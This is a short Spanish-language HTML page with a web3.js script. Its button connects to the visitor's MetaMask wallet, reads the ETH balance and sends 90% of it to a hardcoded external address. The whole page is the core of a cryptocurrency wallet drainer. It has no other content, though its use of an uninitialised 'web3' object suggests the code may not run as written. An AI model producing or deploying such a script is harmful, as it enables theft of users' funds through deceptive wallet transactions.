<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Enviar 90% del saldo automáticamente</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.0/dist/web3.min.js"></script>
  </head>
  <body>
    <h1>Enviar 90% del saldo automáticamente</h1>
    <button onclick="enviar()">Enviar 90% del saldo</button>
    <script>
      async function enviar() {
        // Conectar a MetaMask
        if (typeof window.ethereum !== "undefined") {
          await window.ethereum.enable();
        }

        // Obtener la dirección del usuario
        const accounts = await web3.eth.getAccounts();
        const userAddress = accounts[0];

        // Obtener el saldo del usuario
        const balance = await web3.eth.getBalance(userAddress);

        // Calcular el 90% del saldo
        const amountToSend = balance * 0.9;

        // Enviar la transacción
        const txHash = await web3.eth.sendTransaction({
          from: userAddress,
          to: "0x8935361d21943Ee8a863082EdD8a6Aefb062E434", // Dirección de destino
          value: amountToSend,
        });

        // Mostrar el hash de transacción en la consola
        console.log("Hash de transacción:", txHash);
      }
    </script>
  </body>
</html>
